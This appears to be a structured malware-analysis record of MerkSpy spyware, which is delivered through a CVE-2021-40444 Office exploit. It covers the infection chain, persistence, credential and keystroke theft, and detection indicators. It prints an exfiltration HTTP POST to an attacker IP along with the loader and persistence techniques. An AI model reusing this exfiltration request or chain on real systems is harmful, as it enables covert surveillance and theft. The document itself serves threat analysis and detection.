package_info.package_manager: N/A (delivered as a Windows executable via Office document exploit)
package_info.package_versions: N/A (payload delivered via CVE-2021-40444 exploit chain)
package_info.why_malicious: MerkSpy is a spyware payload delivered through a malicious Office document exploiting CVE-2021-40444. It covertly monitors user activity, exfiltrates sensitive data, achieves persistence, and injects itself into system processes, all without user consent.

malicious_snippets.code_behavior: When the document is opened, the embedded URL is triggered, causing the victim's system to download a remote HTML payload, initiating the infection chain.

malice_analysis.why_suspicious: Office documents should not contain hidden URLs that trigger remote code execution.
malice_analysis.violated_expectations: Normal Office documents do not fetch and execute remote HTML payloads on open.
malice_analysis.similar_legitimate_use: Document templates may reference remote resources, but not executable HTML payloads.

malicious_snippets.code_behavior: During HTML rendering, the script checks system architecture, extracts embedded shellcode, modifies memory permissions to allow execution, and spawns a new thread to run the shellcode, enabling further payload download and execution.

malice_analysis.why_suspicious: HTML files should not contain or execute shellcode, nor manipulate memory permissions or spawn threads.
malice_analysis.violated_expectations: Legitimate HTML/JavaScript in Office context should not perform process injection or memory manipulation.
malice_analysis.similar_legitimate_use: None; these are classic malware techniques.

malicious_snippets.code_behavior: After exploitation, the shellcode downloads an encoded payload ('GoogleUpdate'), decodes it using a custom XOR routine, and executes the resulting binary, which is the MerkSpy spyware.

malice_analysis.why_suspicious: Shellcode that downloads, decodes, and executes a binary is a hallmark of malware loaders.
malice_analysis.violated_expectations: No legitimate process should download and execute obfuscated binaries in this context.
malice_analysis.similar_legitimate_use: Software updaters may download executables, but not via shellcode or with obfuscation.

execution_context.file_location: GoogleUpdate.exe (dropped to disk, injected into system processes)

malicious_snippets.code_behavior: At runtime, the spyware injects itself into system processes, achieves persistence via a registry Run key, monitors keystrokes, captures screenshots, steals Chrome credentials and MetaMask data, and exfiltrates all collected data to a remote server.

malice_analysis.why_suspicious: Process injection, credential theft, and covert data exfiltration are all classic spyware behaviors.
malice_analysis.violated_expectations: Legitimate software does not inject into system processes or steal user credentials.
malice_analysis.similar_legitimate_use: Enterprise monitoring tools may capture some user activity, but with user consent and without exfiltration.

malicious_snippets.code_snippet:
POST /google/update.php HTTP/1.1
Host: 45.89.53.46
User-Agent: WINDOWS
Content-Type: multipart/form-data; boundary=---------------------------update request

-----------------------------update request
Content-Disposition: form-data; name="id"

<hostname|username>
-----------------------------update request
Content-Disposition: form-data; name="key"

<keystroke data or file index>
-----------------------------update request
Content-Disposition: form-data; name="fileToUpload[]"; filename="<filename>"
Content-Type: application/octet-stream

<file data>
-----------------------------update request--
malicious_snippets.code_behavior: After collecting data, the spyware sends a multipart/form-data POST request to the attacker's server, exfiltrating keystrokes, credentials, screenshots, and other files.

malice_analysis.why_suspicious: Unsolicited exfiltration of sensitive user data to an external server is a clear sign of spyware.
malice_analysis.violated_expectations: Legitimate applications do not exfiltrate user data without consent.
malice_analysis.similar_legitimate_use: Cloud backup tools may upload files, but to trusted domains and with user approval.
key_indicators: Multipart form-data POST with sensitive data

attack_chain.action: User opens malicious Office document, triggering CVE-2021-40444 exploit and download of olerender.html.
attack_chain.leads_to: HTML payload execution and shellcode preparation

attack_chain.action: olerender.html executes, checks system architecture, extracts and runs shellcode via memory manipulation and thread creation.
attack_chain.leads_to: Shellcode downloads and executes next-stage payload

attack_chain.action: Shellcode downloads, decodes, and executes the obfuscated MerkSpy payload (GoogleUpdate.exe).
MerkSpy injects into system processes, achieves persistence, and begins surveillance (keystrokes, screenshots, credential theft).
MerkSpy exfiltrates collected data to attacker's C2 server via HTTP POST.

behavioral_signatures: Office document triggers download of remote HTML or executable payloads
HTML/JavaScript in Office context performing memory manipulation and thread creation
Shellcode downloading, decoding, and executing binaries
Persistence via registry Run key masquerading as GoogleUpdate.exe
Unusual outbound HTTP POSTs with multipart/form-data to unknown IPs
file_indicators: Office documents with hidden URLs in _rels/document.xml
network_indicators: HTTP POSTs with User-Agent: WINDOWS and boundary: ---------------------------update request
detection_knowledge.how_to_detect: Monitor for Office documents that trigger downloads of remote HTML or executables, especially those referencing suspicious IPs or domains. Detect memory manipulation and thread creation from Office/IE processes. Flag persistence mechanisms involving GoogleUpdate.exe in the registry. Alert on outbound HTTP POSTs with multipart/form-data to unknown IPs, especially with the specified user-agent and boundary. Correlate process injection, credential access, and screenshot activity with recent document opens.
